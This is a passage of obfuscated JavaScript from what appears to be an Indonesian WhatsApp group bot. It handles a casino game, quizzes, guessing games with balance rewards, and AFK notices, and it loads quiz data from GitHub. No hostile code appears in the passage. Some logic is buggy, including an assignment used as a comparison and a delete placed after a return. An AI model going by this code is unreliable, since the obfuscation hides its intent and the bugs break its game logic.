                    if (_0x43889a < _0x521388) _0x5e1627 = _0x5804c8(0x85a) + _0x4286a2['Z'] + _0x5804c8(0x9a7) + _0x43889a + _0x5804c8(0x3b0) + _0x4286a2['Y'][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x9a7) + _0x521388 + _0x5804c8(0xcaa) + _0x4286a2['Y'][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x94d) + _0x3d6aee(_0x4286a2['nominal']), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                        'text': _0x5e1627,
                        'mentions': [_0x4286a2['Z'] + _0x5804c8(0x7cd), _0x4286a2['Y']]
                    }, {
                        'quoted': _0x1b1e88
                    }), await addBalance('' + _0x4286a2['Y'], _0x3d6aee(_0x4286a2[_0x5804c8(0x264)]), balance), await kurangBalance(_0x4286a2['Z'] + _0x5804c8(0x7cd), _0x3d6aee(_0x4286a2[_0x5804c8(0x264)]), balance), deleteCasino(_0x1b1e88[_0x5804c8(0x60f)]);
                    else(_0x43889a = _0x521388) && (_0x5e1627 = _0x5804c8(0x85a) + _0x4286a2['Z'] + ' --> ' + _0x43889a + _0x5804c8(0xb76) + _0x4286a2['Y'][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x9a7) + _0x521388 + ' 📍\x0a\x0aGames Draw, Tidak Ada Pemenang', _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                        'text': _0x5e1627,
                        'mentions': [_0x4286a2['Z'] + _0x5804c8(0x7cd), _0x4286a2['Y']]
                    }, {
                        'quoted': _0x1b1e88
                    }), deleteCasino(_0x1b1e88['chat']));
                }
            }
        }
        const _0x20f1c6 = (_0x41f0ab, _0x360086) => {
                const _0x13db3e = _0x5804c8;
                return _0x13db3e(0x916) + _0x41f0ab + _0x13db3e(0x6ae) + _0x360086 + _0x13db3e(0x309);
            },
            _0x539017 = _0x118585 => {
                const _0x2d8eb9 = _0x5804c8;
                return _0x2d8eb9(0x9f1) + _0x118585;
            };
        if (kuismath['hasOwnProperty'](_0x1b1e88[_0x5804c8(0xd13)]['split']('@')[0x0]) && !_0x201454) {
            kuis = !![], jawaban = kuismath[_0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0]][0x0], hadiah = kuismath[_0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0]][0x1];
            if (_0x22c514[_0x5804c8(0x7bb)]() == jawaban) _0x614da8[_0x5804c8(0x3aa)](_0x1b1e88['chat'], [{
                'buttonId': _0x5804c8(0x18c),
                'buttonText': {
                    'displayText': _0x5804c8(0xd2b)
                },
                'type': 0x1
            }], _0x5804c8(0x9a4) + hadiah + ' Balance' + '\x0a\x0aKirim perintah .math untuk bermain lagi 🎮', _0xec783b, _0x1b1e88), await addBalance(_0x1b1e88[_0x5804c8(0xd13)], hadiah, balance), delete kuismath[_0x1b1e88['sender'][_0x5804c8(0x4bd)]('@')[0x0]];
            else _0x358f3b('❌ Jawaban salah');
        }
        if (_0x5804c8(0x565) + _0x1b1e88[_0x5804c8(0x60f)] in _family100 && !_0x201454) {
            kuis = !![];
            let _0x4cde03 = _family100['family100' + _0x1b1e88[_0x5804c8(0x60f)]],
                _0x27b022 = _0x22c514[_0x5804c8(0x7bb)]()[_0x5804c8(0xa72)](/[^\w\s\-]+/, ''),
                _0x29f678 = /^((me)?nyerah|surr?ender)$/i [_0x5804c8(0xbaa)](_0x1b1e88[_0x5804c8(0x73c)]);
            if (!_0x29f678) {
                let _0x5a6b91 = _0x4cde03[_0x5804c8(0xcdf)][_0x5804c8(0x16b)](_0xe3f89c => _0xe3f89c[_0x5804c8(0x7bb)]()[_0x5804c8(0xa72)](/[^\w\s\-]+/, '') === _0x27b022);
                if (_0x4cde03[_0x5804c8(0x176)][_0x5a6b91]) return !0x0;
                _0x4cde03[_0x5804c8(0x176)][_0x5a6b91] = _0x1b1e88[_0x5804c8(0xd13)];
            }
            let _0x118c77 = _0x4cde03[_0x5804c8(0x176)][_0x5804c8(0x977)] === _0x4cde03[_0x5804c8(0x176)]['filter'](_0x41282d => _0x41282d)[_0x5804c8(0x977)],
                _0x963a6f = ('\x0aJawablah Pertanyaan Berikut :\x0a' + _0x4cde03['soal'] + _0x5804c8(0x9bf) + _0x4cde03[_0x5804c8(0xcdf)][_0x5804c8(0x977)] + _0x5804c8(0xaf0) + (_0x4cde03[_0x5804c8(0xcdf)][_0x5804c8(0x958)](_0x26be70 => _0x26be70[_0x5804c8(0x34b)](' ')) ? _0x5804c8(0x9ab) : '') + '\x0a' + (_0x118c77 ? 'Semua Jawaban Terjawab' : _0x29f678 ? _0x5804c8(0xabb) : '') + '\x0a' + Array[_0x5804c8(0x44e)](_0x4cde03[_0x5804c8(0xcdf)], (_0x5092fd, _0x435288) => {
                    const _0x147d53 = _0x5804c8;
                    return _0x29f678 || _0x4cde03[_0x147d53(0x176)][_0x435288] ? ('(' + (_0x435288 + 0x1) + ') ' + _0x5092fd + ' ' + (_0x4cde03[_0x147d53(0x176)][_0x435288] ? '@' + _0x4cde03[_0x147d53(0x176)][_0x435288][_0x147d53(0x4bd)]('@')[0x0] : ''))[_0x147d53(0xd5d)]() : ![];
                })['filter'](_0x214551 => _0x214551)['join']('\x0a') + '\x0a' + (_0x29f678 ? '' : ''))[_0x5804c8(0xd5d)]();
            _0x614da8[_0x5804c8(0x2a4)](_0x1b1e88[_0x5804c8(0x60f)], _0x963a6f, _0x1b1e88)[_0x5804c8(0xabe)](_0x579ffb => {
                const _0x592dc0 = _0x5804c8;
                return _family100[_0x592dc0(0x565) + _0x1b1e88[_0x592dc0(0x60f)]]['pesan'] = mesg;
            })[_0x5804c8(0xb9d)](_0x361dfb => _0x361dfb);
            if (_0x118c77 || _0x29f678) delete _family100[_0x5804c8(0x565) + _0x1b1e88[_0x5804c8(0x60f)]];
        }
        if (tebakgame[_0x1b1e88[_0x5804c8(0x60f)]] && !_0x201454 && _0x1b1e88['quoted']) {
            if (_0x1b1e88['quoted']['id'] == tebakgame[_0x1b1e88[_0x5804c8(0x60f)]][0x0][_0x5804c8(0x2a9)]['id']) {
                let _0x45d269 = JSON[_0x5804c8(0x370)](JSON[_0x5804c8(0x736)](tebakgame[_0x1b1e88[_0x5804c8(0x60f)]][0x1]));
                jawaban = _0x45d269[_0x5804c8(0xcdf)]['toLowerCase']()['trim']();
                if (_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)]() == jawaban) await addBalance(_0x1b1e88[_0x5804c8(0xd13)], tebakgame[_0x1b1e88[_0x5804c8(0x60f)]][0x2], balance), await _0x358f3b(_0x20f1c6('Tebak Bendera', tebakgame[_0x1b1e88[_0x5804c8(0x60f)]][0x2]) + _0x5804c8(0x4e5), _0xec783b, _0x1b1e88), clearTimeout(tebakgame[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tebakgame[_0x1b1e88[_0x5804c8(0x60f)]];
                else {
                    if (similarity(_0x1b1e88['text']['toLowerCase'](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x614da8[_0x5804c8(0x970)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xbed) + _0x5804c8(0xa01), _0xec783b, _0x5804c8(0xcf6), _0x5804c8(0x882), _0x5804c8(0xd68), _0x5804c8(0x493), _0x1b1e88);
                }
            }
        }
        if (tebakgambar[_0x1b1e88['chat']] && !_0x201454 && _0x1b1e88[_0x5804c8(0x6a4)]) {
            if (_0x1b1e88['quoted']['id'] == tebakgambar[_0x1b1e88[_0x5804c8(0x60f)]][0x0][_0x5804c8(0x2a9)]['id']) {
                let _0x2d52b8 = JSON[_0x5804c8(0x370)](JSON[_0x5804c8(0x736)](tebakgambar[_0x1b1e88[_0x5804c8(0x60f)]][0x1]));
                jawaban = _0x2d52b8[_0x5804c8(0xcdf)]['toLowerCase']()['trim']();
                if (_0x1b1e88['text'][_0x5804c8(0x7bb)]() == jawaban) await addBalance(_0x1b1e88[_0x5804c8(0xd13)], tebakgambar[_0x1b1e88[_0x5804c8(0x60f)]][0x2], balance), await _0x358f3b(_0x20f1c6(_0x5804c8(0x32a), tebakgambar[_0x1b1e88[_0x5804c8(0x60f)]][0x2]) + _0x5804c8(0x5b0), _0xec783b, _0x1b1e88), clearTimeout(tebakgambar[_0x1b1e88['chat']][0x3]), delete tebakgambar[_0x1b1e88[_0x5804c8(0x60f)]];
                else {
                    if (similarity(_0x1b1e88[_0x5804c8(0x73c)]['toLowerCase'](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x614da8[_0x5804c8(0x970)](_0x1b1e88['chat'], '❌ Jawaban salah' + '\x0a\x0aKirim perintah .tega untuk bantuan dan .ytega untuk menyerah 🎮', _0xec783b, _0x5804c8(0x55e), _0x5804c8(0x882), _0x5804c8(0x6e5), 'Nyerah', _0x1b1e88);
                }
            }
        }
        if (tebakkata[_0x1b1e88[_0x5804c8(0x60f)]] && !_0x201454 && _0x1b1e88['quoted']) {
            if (_0x1b1e88[_0x5804c8(0x6a4)]['id'] == tebakkata[_0x1b1e88[_0x5804c8(0x60f)]][0x0][_0x5804c8(0x2a9)]['id']) {
                let _0x35bbc1 = JSON[_0x5804c8(0x370)](JSON['stringify'](tebakkata[_0x1b1e88['chat']][0x1]));
                jawaban = _0x35bbc1['jawaban'][_0x5804c8(0x7bb)]()[_0x5804c8(0xd5d)]();
                if (_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)]() == jawaban) await addBalance(_0x1b1e88['sender'], tebakkata[_0x1b1e88['chat']][0x2], balance), await _0x358f3b(_0x20f1c6(_0x5804c8(0x362), tebakkata[_0x1b1e88['chat']][0x2]) + _0x5804c8(0x748), _0xec783b, _0x1b1e88), clearTimeout(tebakkata[_0x1b1e88['chat']][0x3]), delete tebakkata[_0x1b1e88[_0x5804c8(0x60f)]];
                else {
                    if (similarity(_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x614da8['send2ButMes'](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xbed) + _0x5804c8(0xae3), _0xec783b, _0x5804c8(0xc0e), _0x5804c8(0x882), _0x5804c8(0x2b2), _0x5804c8(0x493), _0x1b1e88);
                }
            }
        }
        if (tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]] && !_0x201454 && _0x1b1e88['quoted']) {
            if (_0x1b1e88[_0x5804c8(0x6a4)]['id'] == tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]][0x0][_0x5804c8(0x2a9)]['id']) {
                let _0x22d377 = JSON[_0x5804c8(0x370)](JSON[_0x5804c8(0x736)](tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]][0x1]));
                jawaban = _0x22d377[_0x5804c8(0x35b)]['toLowerCase']()[_0x5804c8(0xd5d)]();
                if (_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)]() == jawaban) await addBalance(_0x1b1e88['sender'], tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]][0x2], balance), await _0x358f3b(_0x20f1c6(_0x5804c8(0xb31), tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]][0x2]) + _0x5804c8(0x185), _0xec783b, _0x1b1e88), clearTimeout(tebakbendera[_0x1b1e88['chat']][0x3]), delete tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]];
                else {
                    if (similarity(_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x614da8[_0x5804c8(0x970)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xbed) + _0x5804c8(0x47c), _0xec783b, '.tebe', _0x5804c8(0x882), '.ytebe', 'Nyerah', _0x1b1e88);
                }
            }
        }
        if (caklontong[_0x1b1e88[_0x5804c8(0x60f)]] && !_0x201454 && _0x1b1e88['quoted']) {
            if (_0x1b1e88[_0x5804c8(0x6a4)]['id'] == caklontong[_0x1b1e88[_0x5804c8(0x60f)]][0x0][_0x5804c8(0x2a9)]['id']) {
                let _0x292b65 = JSON[_0x5804c8(0x370)](JSON['stringify'](caklontong[_0x1b1e88['chat']][0x1]));
                jawaban = _0x292b65['jawaban']['toLowerCase']()['trim']();
                if (_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)]() == jawaban) await addBalance(_0x1b1e88[_0x5804c8(0xd13)], caklontong[_0x1b1e88['chat']][0x2], balance), await _0x358f3b(_0x20f1c6(_0x5804c8(0xa8e), caklontong[_0x1b1e88[_0x5804c8(0x60f)]][0x2]) + _0x5804c8(0x631), _0xec783b, _0x1b1e88), clearTimeout(caklontong[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete caklontong[_0x1b1e88['chat']];
                else {
                    if (similarity(_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x614da8[_0x5804c8(0x970)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xbed) + _0x5804c8(0x625), _0xec783b, _0x5804c8(0xb24), _0x5804c8(0x882), _0x5804c8(0x75b), _0x5804c8(0x493), _0x1b1e88);
                }
            }
        }
        if (susunkata[_0x1b1e88['chat']] && !_0x201454 && _0x1b1e88['quoted']) {
            if (_0x1b1e88[_0x5804c8(0x6a4)]['id'] == susunkata[_0x1b1e88[_0x5804c8(0x60f)]][0x0][_0x5804c8(0x2a9)]['id']) {
                let _0x50c8ae = JSON[_0x5804c8(0x370)](JSON[_0x5804c8(0x736)](susunkata[_0x1b1e88['chat']][0x1]));
                jawaban = _0x50c8ae['jawaban'][_0x5804c8(0x7bb)]()[_0x5804c8(0xd5d)]();
                if (_0x1b1e88[_0x5804c8(0x73c)]['toLowerCase']() == jawaban) await addBalance(_0x1b1e88[_0x5804c8(0xd13)], susunkata[_0x1b1e88[_0x5804c8(0x60f)]][0x2], balance), await _0x358f3b(_0x20f1c6(_0x5804c8(0xcb2), susunkata[_0x1b1e88[_0x5804c8(0x60f)]][0x2]) + _0x5804c8(0x8c4), _0xec783b, _0x1b1e88), clearTimeout(susunkata[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete susunkata[_0x1b1e88[_0x5804c8(0x60f)]];
                else {
                    if (similarity(_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x358f3b(_0x5804c8(0xbed) + _0x5804c8(0xb98));
                }
            }
        }
        if (tebakkalimat[_0x1b1e88[_0x5804c8(0x60f)]] && !_0x201454 && _0x1b1e88[_0x5804c8(0x6a4)]) {
            if (_0x1b1e88['quoted']['id'] == tebakkalimat[_0x1b1e88[_0x5804c8(0x60f)]][0x0][_0x5804c8(0x2a9)]['id']) {
                let _0x4e7f3c = JSON[_0x5804c8(0x370)](JSON['stringify'](tebakkalimat[_0x1b1e88[_0x5804c8(0x60f)]][0x1]));
                jawaban = _0x4e7f3c[_0x5804c8(0xcdf)][_0x5804c8(0x7bb)]()[_0x5804c8(0xd5d)]();
                if (_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)]() == jawaban) await addBalance(_0x1b1e88['sender'], tebakkalimat[_0x1b1e88[_0x5804c8(0x60f)]][0x2], balance), await _0x358f3b(_0x20f1c6(_0x5804c8(0x6f0), tebakkalimat[_0x1b1e88['chat']][0x2]) + _0x5804c8(0xbe0), _0xec783b, _0x1b1e88), clearTimeout(tebakkalimat[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tebakkalimat[_0x1b1e88[_0x5804c8(0x60f)]];
                else {
                    if (similarity(_0x1b1e88[_0x5804c8(0x73c)]['toLowerCase'](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x614da8['send2ButMes'](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xbed) + _0x5804c8(0xcdb), _0xec783b, _0x5804c8(0x4d1), _0x5804c8(0x882), '.ytekatu', _0x5804c8(0x493), _0x1b1e88);
                }
            }
        }
        if (siapaaku[_0x1b1e88['chat']] && !_0x201454 && _0x1b1e88[_0x5804c8(0x6a4)]) {
            if (_0x1b1e88['quoted']['id'] == siapaaku[_0x1b1e88[_0x5804c8(0x60f)]][0x0]['key']['id']) {
                let _0x2d1de8 = JSON[_0x5804c8(0x370)](JSON[_0x5804c8(0x736)](siapaaku[_0x1b1e88[_0x5804c8(0x60f)]][0x1]));
                jawaban = _0x2d1de8['jawaban'][_0x5804c8(0x7bb)]()[_0x5804c8(0xd5d)]();
                if (_0x1b1e88['text']['toLowerCase']() == jawaban) await addBalance(_0x1b1e88[_0x5804c8(0xd13)], siapaaku[_0x1b1e88['chat']][0x2], balance), await _0x358f3b(_0x20f1c6('Tebak Siapa', siapaaku[_0x1b1e88[_0x5804c8(0x60f)]][0x2]) + _0x5804c8(0x83b), _0xec783b, _0x1b1e88), clearTimeout(siapaaku[_0x1b1e88['chat']][0x3]), delete siapaaku[_0x1b1e88[_0x5804c8(0x60f)]];
                else {
                    if (similarity(_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x614da8[_0x5804c8(0x970)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xbed) + '\x0a\x0aKirim perintah .tesi untuk bantuan dan .ytesi untuk menyerah 🎮', _0xec783b, '.tesi', 'Hint', _0x5804c8(0x1a1), 'Nyerah', _0x1b1e88);
                }
            }
        }
        if (tekateki[_0x1b1e88[_0x5804c8(0x60f)]] && !_0x201454 && _0x1b1e88['quoted']) {
            if (_0x1b1e88['quoted']['id'] == tekateki[_0x1b1e88[_0x5804c8(0x60f)]][0x0]['key']['id']) {
                let _0x36c69d = JSON[_0x5804c8(0x370)](JSON[_0x5804c8(0x736)](tekateki[_0x1b1e88[_0x5804c8(0x60f)]][0x1]));
                jawaban = _0x36c69d[_0x5804c8(0xcdf)][_0x5804c8(0x7bb)]()[_0x5804c8(0xd5d)]();
                if (_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)]() == jawaban) await addBalance(_0x1b1e88['sender'], tekateki[_0x1b1e88[_0x5804c8(0x60f)]][0x2], balance), await _0x358f3b(_0x20f1c6(_0x5804c8(0xb1d), tekateki[_0x1b1e88[_0x5804c8(0x60f)]][0x2]) + _0x5804c8(0x4ab), _0xec783b, _0x1b1e88), clearTimeout(tekateki[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tekateki[_0x1b1e88[_0x5804c8(0x60f)]];
                else {
                    if (similarity(_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x614da8[_0x5804c8(0x970)](_0x1b1e88[_0x5804c8(0x60f)], '❌ Jawaban salah' + _0x5804c8(0x7fe), _0xec783b, _0x5804c8(0x7de), _0x5804c8(0x882), _0x5804c8(0x3ae), _0x5804c8(0x493), _0x1b1e88);
                }
            }
        }
        if (tebakkimia[_0x1b1e88[_0x5804c8(0x60f)]] && !_0x201454 && _0x1b1e88['quoted']) {
            if (_0x1b1e88[_0x5804c8(0x6a4)]['id'] == tebakkimia[_0x1b1e88[_0x5804c8(0x60f)]][0x0]['key']['id']) {
                let _0x395f91 = JSON[_0x5804c8(0x370)](JSON[_0x5804c8(0x736)](tebakkimia[_0x1b1e88[_0x5804c8(0x60f)]][0x1]));
                jawaban = _0x395f91[_0x5804c8(0x86a)]['toLowerCase']()['trim']();
                if (_0x1b1e88['text'][_0x5804c8(0x7bb)]() == jawaban) await addBalance(_0x1b1e88[_0x5804c8(0xd13)], tebakkimia[_0x1b1e88[_0x5804c8(0x60f)]][0x2], balance), await _0x358f3b(_0x20f1c6(_0x5804c8(0xd24), tebakkimia[_0x1b1e88['chat']][0x2]) + _0x5804c8(0xa33), _0xec783b, _0x1b1e88), clearTimeout(tebakkimia[_0x1b1e88['chat']][0x3]), delete tebakkimia[_0x1b1e88['chat']];
                else {
                    if (similarity(_0x1b1e88[_0x5804c8(0x73c)][_0x5804c8(0x7bb)](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x614da8[_0x5804c8(0x970)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xbed) + _0x5804c8(0x205), _0xec783b, _0x5804c8(0x764), _0x5804c8(0x882), _0x5804c8(0x340), _0x5804c8(0x493), _0x1b1e88);
                }
            }
        }
        if (tebaklirik[_0x1b1e88['chat']] && !_0x201454 && _0x1b1e88['quoted']) {
            if (_0x1b1e88[_0x5804c8(0x6a4)]['id'] == tebaklirik[_0x1b1e88[_0x5804c8(0x60f)]][0x0][_0x5804c8(0x2a9)]['id']) {
                let _0x20e0ab = JSON['parse'](JSON[_0x5804c8(0x736)](tebaklirik[_0x1b1e88['chat']][0x1]));
                jawaban = _0x20e0ab[_0x5804c8(0xcdf)][_0x5804c8(0x7bb)]()[_0x5804c8(0xd5d)]();
                if (_0x1b1e88[_0x5804c8(0x73c)]['toLowerCase']() == jawaban) await addBalance(_0x1b1e88[_0x5804c8(0xd13)], tebaklirik[_0x1b1e88[_0x5804c8(0x60f)]][0x2], balance), await _0x358f3b(_0x20f1c6(_0x5804c8(0xc8f), tebaklirik[_0x1b1e88[_0x5804c8(0x60f)]][0x2]) + '\x0a\x0aKirim perintah .tebaklirik untuk bermain lagi 🎮', _0xec783b, _0x1b1e88), clearTimeout(tebaklirik[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tebaklirik[_0x1b1e88[_0x5804c8(0x60f)]];
                else {
                    if (similarity(_0x1b1e88['text'][_0x5804c8(0x7bb)](), jawaban) >= threshold) _0x358f3b(_0x5804c8(0x9d5));
                    else _0x614da8['send2ButMes'](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xbed) + '\x0a\x0aKirim perintah .teli untuk bantuan dan .yteli untuk menyerah 🎮', _0xec783b, _0x5804c8(0x64c), _0x5804c8(0x882), _0x5804c8(0x511), _0x5804c8(0x493), _0x1b1e88);
                }
            }
        }
        if (tebaktebakan[_0x1b1e88['chat']] && !_0x201454 && _0x1b1e88[_0x5804c8(0x6a4)]) {
            if (_0x1b1e88['quoted']['id'] == tebaktebakan[_0x1b1e88[_0x5804c8(0x60f)]][0x0][_0x5804c8(0x2a9)]['id']) {
                let _0x4eb273 = JSON[_0x5804c8(0x370)](JSON[_0x5804c8(0x736)](tebaktebakan[_0x1b1e88[_0x5804c8(0x60f)]][0x1]));
                jawaban = _0x4eb273[_0x5804c8(0xcdf)][_0x5804c8(0x7bb)]()['trim']();
                if (_0x1b1e88[_0x5804c8(0x73c)]['toLowerCase']() == jawaban) await addBalance(_0x1b1e88[_0x5804c8(0xd13)], tebaktebakan[_0x1b1e88[_0x5804c8(0x60f)]][0x2], balance), await _0x358f3b(_0x20f1c6(_0x5804c8(0xd4e), tebaktebakan[_0x1b1e88[_0x5804c8(0x60f)]][0x2]) + _0x5804c8(0x457), _0xec783b, _0x1b1e88), clearTimeout(tebaktebakan[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tebaktebakan[_0x1b1e88[_0x5804c8(0x60f)]];
                else {
                    if (similarity(_0x1b1e88['text'][_0x5804c8(0x7bb)](), jawaban) >= threshold) _0x358f3b('_Ya, Dikit Lagi!_');
                    else _0x614da8['send2ButMes'](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xbed) + _0x5804c8(0x862), _0xec783b, _0x5804c8(0x72d), 'Hint', _0x5804c8(0x9f5), _0x5804c8(0x493), _0x1b1e88);
                }
            }
        }
        if (_0x1b1e88[_0x5804c8(0xcea)] && !_0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xcbd)]) {
            let _0x13d667 = [...new Set([..._0x1b1e88[_0x5804c8(0x583)] || [], ..._0x1b1e88['quoted'] ? [_0x1b1e88[_0x5804c8(0x6a4)]['sender']] : []])];
            for (let _0x14fb4e of _0x13d667) {
                if (afk[_0x5804c8(0xc77)](_0x14fb4e, _afk)) {
                    let _0x381624 = afk[_0x5804c8(0x5af)](_0x14fb4e, _afk),
                        _0x385301 = afk[_0x5804c8(0xad4)](_0x381624, _afk),
                        _0x5c4b15 = Date[_0x5804c8(0x7e5)]() - afk[_0x5804c8(0x439)](_0x381624, _afk),
                        _0x3efac0 = ms(_0x5c4b15);
                    _0x358f3b(_0x5804c8(0x31e) + _0x385301 + _0x5804c8(0x6e2) + _0x3efac0['hours'] + _0x5804c8(0x8ad) + _0x3efac0[_0x5804c8(0xb15)] + _0x5804c8(0xab7) + _0x3efac0[_0x5804c8(0xbb1)] + _0x5804c8(0xa04));
                }
            }
            if (afk[_0x5804c8(0xc77)](_0x1b1e88[_0x5804c8(0xd13)], _afk)) {
                let _0x56451b = afk[_0x5804c8(0x5af)](_0x1b1e88[_0x5804c8(0xd13)], _afk),
                    _0x5afe3a = afk[_0x5804c8(0xad4)](_0x56451b, _afk),
                    _0x334be3 = Date[_0x5804c8(0x7e5)]() - afk[_0x5804c8(0x439)](_0x56451b, _afk),
                    _0x36b45f = ms(_0x334be3);
                _afk['splice'](afk['getAfkPosition'](_0x1b1e88['sender'], _afk), 0x1), fs['writeFileSync'](_0x5804c8(0xbce), JSON[_0x5804c8(0x736)](_afk)), _0x614da8[_0x5804c8(0x2a4)](_0x1b1e88[_0x5804c8(0x60f)], '@' + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0xd1e) + _0x5afe3a + _0x5804c8(0x6c8) + _0x36b45f['hours'] + _0x5804c8(0x2e0) + _0x36b45f[_0x5804c8(0xb15)] + ' menit ' + _0x36b45f[_0x5804c8(0xbb1)] + _0x5804c8(0x152), _0x1b1e88);
            }
        }
        switch (_0x453fc1) {
        case _0x5804c8(0x981): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (tebakgambar[_0x1b1e88[_0x5804c8(0x60f)]]) return _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x8d3)
            }, {
                'quoted': tebakgambar[_0x1b1e88[_0x5804c8(0x60f)]][0x0]
            });
            let _0x37b2a6 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json'),
                _0x127a84 = _0x37b2a6[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x37b2a6[_0x5804c8(0x977)])];
            console[_0x5804c8(0xcd3)](_0x5804c8(0xd07) + _0x127a84['jawaban']), tebakgambar[_0x1b1e88['chat']] = [await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x127a84['img']
                },
                'caption': _0x5804c8(0x56d) + _0x127a84['deskripsi'] + _0x5804c8(0x447) + (0x1d4c0 / 0x3e8)[_0x5804c8(0xac7)](0x2) + _0x5804c8(0xc65)
            }, {
                'quoted': _0x1b1e88
            }), _0x127a84, 0xfa, setTimeout(() => {
                const _0x282fd8 = _0x5804c8;
                if (tebakgambar[_0x1b1e88['chat']]) {
                    return _0x358f3b(_0x539017(_0x127a84[_0x282fd8(0xcdf)]), _0xec783b, _0x1b1e88);
                    delete tebakgambar[_0x1b1e88[_0x282fd8(0x60f)]];
                }
            }, 0x1d4c0)];
        }
        break;
        case _0x5804c8(0x65c): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88['chat'] in tebakgambar)) return;
            let _0x5d7783 = tebakgambar[_0x1b1e88[_0x5804c8(0x60f)]][0x1];
            _0x614da8['send1ButMes'](_0x1b1e88['chat'], _0x5804c8(0xd16) + _0x5d7783['jawaban'][_0x5804c8(0xa72)](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + _0x5804c8(0xd16), _0xec783b, _0x5804c8(0x6e5), _0x5804c8(0x827), _0x1b1e88);
        }
        break;
        case _0x5804c8(0x535): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!(_0x1b1e88['chat'] in tebakgambar)) return;
            return clearTimeout(tebakgambar[_0x1b1e88['chat']][0x3]), delete tebakgambar[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x824)
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x19a): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (tebakgame[_0x1b1e88[_0x5804c8(0x60f)]]) return _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x5804c8(0x8d3)
            }, {
                'quoted': tebakgame[_0x1b1e88[_0x5804c8(0x60f)]][0x0]
            });
            let _0x2c6545 = await fetchJson(_0x5804c8(0x228)),
                _0x252a88 = _0x2c6545[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x2c6545[_0x5804c8(0x977)])];
            console[_0x5804c8(0xcd3)](_0x5804c8(0xd07) + _0x252a88[_0x5804c8(0xcdf)]), tebakgame[_0x1b1e88[_0x5804c8(0x60f)]] = [await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x252a88[_0x5804c8(0x8f7)]
                },
                'caption': _0x5804c8(0x479) + (0x1d4c0 / 0x3e8)[_0x5804c8(0xac7)](0x2) + _0x5804c8(0xc65)
            }, {
